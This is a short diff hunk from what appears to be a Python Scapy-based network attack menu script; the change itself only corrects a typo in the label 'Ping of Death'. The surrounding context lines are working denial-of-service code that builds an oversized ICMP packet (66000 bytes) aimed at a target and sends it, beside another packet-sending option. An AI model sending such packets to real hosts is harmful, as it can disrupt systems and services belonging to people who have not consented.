@@ -53,7 +53,7 @@ while Run:
         send(packet2) 
 
     if input_value == '7':
-        print("Ping of Deatch\n")
+        print("Ping of Death\n")
         packet = IP(dst=target) / ICMP() / ("X" * 66000)
         send(packet)
 
